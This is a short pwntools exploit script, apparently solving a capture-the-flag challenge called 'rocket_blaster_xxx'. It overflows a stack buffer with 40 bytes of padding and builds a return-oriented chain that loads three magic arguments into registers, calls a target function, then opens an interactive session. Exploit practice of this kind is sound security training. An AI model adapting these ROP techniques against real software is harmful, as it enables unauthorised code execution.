from pwn import *
from icecream import ic

elf = exe = ELF("./rocket_blaster_xxx")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x000000000040134d
b *0x0000000000401394
b *0x00000000004013e2
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
ret = 0x000000000040101a
ammo = 0x00000000004012f5
pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b
ru(">>")
payload = b'a'*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xdeadbabe)
payload += p64(pop_rdx)
payload += p64(0xdead1337)
payload += p64(ammo)
sl(payload)
i()
